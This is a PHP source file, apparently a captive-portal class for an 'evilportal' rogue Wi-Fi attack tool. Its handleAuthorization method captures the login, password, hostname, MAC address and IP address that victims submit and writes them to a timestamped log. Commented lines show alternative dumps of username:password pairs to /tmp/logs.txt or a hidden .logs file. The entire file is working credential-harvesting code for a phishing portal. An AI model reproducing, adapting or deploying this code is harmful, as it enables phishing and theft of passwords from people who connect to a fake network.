<?php namespace evilportal;

class MyPortal extends Portal
{

    public function handleAuthorization()
    {
        // handle form input or other extra things there

        // Call parent to handle basic authorization first
        //parent::handleAuthorization();

       //Writes creditentials to tmp/logs.txt
        //file_put_contents("/tmp/logs.txt", "New connection -> " . $this->request->login . ":" . $this->request->password . "\n", FILE_APPEND);
        //Writes user:password creditentials to {portalName}/.logs  
       // $this->writeLog($this->request->login . ":" . $this->request->password . "\n");
        if (isset($_POST['login'])) {
            $login = isset($_POST['login']) ? $_POST['login'] : 'login';
            $pwd = isset($_POST['password']) ? $_POST['password'] : 'password';
            $hostname = isset($_POST['hostname']) ? $_POST['hostname'] : 'hostname';
            $mac = isset($_POST['mac']) ? $_POST['mac'] : 'mac';
            $ip = isset($_POST['ip']) ? $_POST['ip'] : 'ip';
            $this->writeLog("[" . date('Y-m-d H:i:s') . "Z]\n" . "login: {$login}\npassword: {$pwd}\nhostname: {$hostname}\nmac: {$mac}\nip: {$ip}\n\n", FILE_APPEND);

        }
	parent::handleAuthorization();
 }

    /**
     * Override this to do something when the client is successfully authorized.
     * By default it just notifies the Web UI.
     */
    public function onSuccess()
    {
        // Calls default success message
        parent::onSuccess();
        
    }

    /**
     * If an error occurs then do something here.
     * Override to provide your own functionality.
     */
    public function showError()
    {
        // Calls default error message
        parent::showError();
    }

}